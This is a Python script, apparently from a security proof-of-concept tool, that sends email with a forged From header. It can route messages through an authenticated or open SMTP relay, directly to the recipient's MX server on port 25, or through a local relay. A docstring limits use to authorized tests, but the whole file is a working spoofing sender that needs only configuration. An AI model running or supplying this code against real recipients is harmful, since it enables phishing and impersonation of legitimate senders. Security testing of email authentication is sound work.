"""
Spoofing Detector — Email Sender

WARNING: This script is strictly for demonstrating vulnerabilities
in authorized environments. Unauthorized use is a criminal offense.

Technique demonstrated:
  When a domain lacks proper SPF/DKIM/DMARC configuration, it is possible
  to send emails with an arbitrary "From" header, making the recipient
  believe the message originated from a legitimate sender.
"""

import smtplib
import socket
import dns.resolver
import sys
from typing import Optional
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr, formatdate, make_msgid
from config import SMTPConfig, SpoofConfig, LocalRelayConfig


def get_mx_host(domain: str) -> Optional[str]:
    """Resolves the highest-priority MX server for a given domain."""
    try:
        answers = dns.resolver.resolve(domain, "MX")
        records = sorted(answers, key=lambda r: r.preference)
        return str(records[0].exchange).rstrip(".")
    except Exception as e:
        print(f"[!] Failed to resolve MX for '{domain}': {e}")
        return None


def build_email(spoof: SpoofConfig) -> MIMEMultipart:
    msg = MIMEMultipart("alternative")

    # Forged From header — what the recipient will see
    msg["From"] = formataddr((spoof.display_name, spoof.from_address))
    msg["To"] = spoof.to_address
    msg["Subject"] = spoof.subject
    msg["Date"] = formatdate(localtime=True)

    # Extract domain from from_address for Message-ID
    try:
        domain = spoof.from_address.split("@")[1]
    except IndexError:
        print("[!] Error: SPOOF_FROM_ADDRESS must be a valid email (e.g., user@example.com)")
        sys.exit(1)

    msg["Message-ID"] = make_msgid(domain=domain)

    if spoof.reply_to:
        msg["Reply-To"] = spoof.reply_to

    msg["X-POC-Note"] = "Email Spoofing Demonstration - Authorized Security Test"

    msg.attach(MIMEText(spoof.body_text, "plain"))
    if spoof.body_html:
        msg.attach(MIMEText(spoof.body_html, "html"))

    return msg


def send_via_relay(msg: MIMEMultipart, spoof: SpoofConfig, smtp: SMTPConfig) -> bool:
    """Sends the email through a configured SMTP relay server."""
    print(f"[*] Connecting to relay: {smtp.host}:{smtp.port}")
    try:
        if smtp.use_ssl:
            conn = smtplib.SMTP_SSL(smtp.host, smtp.port, timeout=smtp.timeout)
        else:
            conn = smtplib.SMTP(smtp.host, smtp.port, timeout=smtp.timeout)
            if smtp.use_tls:
                conn.starttls()

        conn.ehlo()

        if smtp.username and smtp.password:
            conn.login(smtp.username, smtp.password)
            print(f"[*] Authenticated as: {smtp.username}")
        else:
            print("[*] No authentication (open relay)")

        # SMTP envelope MAIL FROM — can differ from the visible From header.
        # This discrepancy is the core of email spoofing.
        conn.sendmail(
            from_addr=spoof.envelope_from or spoof.from_address,
            to_addrs=[spoof.to_address],
            msg=msg.as_string()
        )
        conn.quit()
        return True
    except Exception as e:
        print(f"[!] Relay failed: {e}")
        return False


def send_direct_mx(msg: MIMEMultipart, spoof: SpoofConfig) -> bool:
    """Sends directly to the recipient's MX server (no relay, port 25)."""
    to_domain = spoof.to_address.split("@")[1]
    mx_host = get_mx_host(to_domain)

    if not mx_host:
        print(f"[!] Could not resolve MX for '{to_domain}'")
        return False

    # Force IPv4 to avoid rejection due to missing PTR records on IPv6
    try:
        ipv4 = socket.getaddrinfo(mx_host, 25, socket.AF_INET)[0][4][0]
    except Exception:
        ipv4 = mx_host

    print(f"[*] Sending directly to MX: {mx_host} ({ipv4}):25")
    try:
        conn = smtplib.SMTP(ipv4, 25, timeout=10)
        conn.ehlo()
        conn.sendmail(
            from_addr=spoof.envelope_from or spoof.from_address,
            to_addrs=[spoof.to_address],
            msg=msg.as_string()
        )
        conn.quit()
        return True
    except Exception as e:
        print(f"[!] Direct MX delivery failed: {e}")
        return False


def send_via_local(msg: MIMEMultipart, spoof: SpoofConfig, host: str = "127.0.0.1", port: int = 2525) -> bool:
    """Sends via local SMTP relay (local_relay.py) with no sender restrictions."""
    print(f"[*] Connecting to local relay: {host}:{port}")
    try:
        conn = smtplib.SMTP(host, port, timeout=10)
        conn.sendmail(
            from_addr=spoof.envelope_from or spoof.from_address,
            to_addrs=[spoof.to_address],
            msg=msg.as_string()
        )
        conn.quit()
        return True
    except ConnectionRefusedError:
        print(f"[!] Local relay is not running. Start it first: python local_relay.py")
        return False
    except Exception as e:
        print(f"[!] Local relay failed: {e}")
        return False


def run(use_relay: bool = True, use_local: bool = False):
    smtp_cfg = SMTPConfig()
    spoof_cfg = SpoofConfig()
    local_cfg = LocalRelayConfig()

    if use_local:
        method = f"Local Relay ({local_cfg.host}:{local_cfg.port})"
    elif use_relay:
        method = f"SMTP Relay ({smtp_cfg.host})"
    else:
        method = "Direct MX (port 25)"

    print("\n" + "="*60)
    print("  Spoofing Detector — Email Spoofing POC")
    print("="*60)
    print(f"\n  From (visible) : {spoof_cfg.display_name} <{spoof_cfg.from_address}>")
    print(f"  Envelope From  : {spoof_cfg.envelope_from or spoof_cfg.from_address}")
    print(f"  To             : {spoof_cfg.to_address}")
    print(f"  Subject        : {spoof_cfg.subject}")
    print(f"  Method         : {method}")
    print()

    msg = build_email(spoof_cfg)

    if use_local:
        success = send_via_local(msg, spoof_cfg, host=local_cfg.host, port=local_cfg.port)
    elif use_relay:
        success = send_via_relay(msg, spoof_cfg, smtp_cfg)
    else:
        success = send_direct_mx(msg, spoof_cfg)

    if success:
        print("\n[+] Email sent successfully.")
        print(f"    Recipient will see sender as: {spoof_cfg.display_name} <{spoof_cfg.from_address}>")
        print("    Inspect the full email headers to confirm the lack of authentication.\n")
    else:
        print("\n[-] Send failed. Check your .env configuration.\n")


if __name__ == "__main__":
    use_local = "--local" in sys.argv
    use_direct = "--direct" in sys.argv
    run(use_relay=not use_direct and not use_local, use_local=use_local)
